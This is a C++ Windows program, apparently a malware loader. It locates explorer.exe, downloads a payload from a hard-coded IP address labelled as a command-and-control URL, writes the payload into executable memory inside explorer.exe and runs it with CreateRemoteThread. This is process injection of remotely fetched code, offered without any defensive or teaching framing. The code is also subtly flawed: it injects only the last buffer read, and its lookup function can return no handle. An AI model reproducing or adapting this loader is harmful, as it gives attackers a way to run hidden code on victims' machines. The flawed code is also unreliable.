#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

HANDLE GetProcesHandleName() {
    HANDLE ProcessHandle;


    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE allProcesses;
    allProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(allProcesses, &procEntry) == TRUE) {
        while (Process32Next(allProcesses, &procEntry) == TRUE) {
            wchar_t newtargetProcName[1024] = L"explorer.exe";

            if (wcscmp(procEntry.szExeFile, newtargetProcName) == 0) {
                cout << "Process ID Found! PID: " << procEntry.th32ProcessID << "\n";
                ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procEntry.th32ProcessID);
                return ProcessHandle;
            }

        }

    }

}

int main()
{
    HANDLE hProcess;
    SIZE_T dwSize = 461;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = GetProcesHandleName();
    const char* c2URL = "http://35.170.245.62/index.asm";
    IStream* stream;
    char buff[461];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 461, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize,flAllocationType,flProtect);
    cout << "[+] Memory Allocated at:" << memAddr << "\n";
    
    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
    cout << "[+] Number of bytes written: " << bytesOut << "\n";

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    cout << "[+] Thread Spawned, PID: " << NULL << "\n";
    stream->Release();
    return 0;
}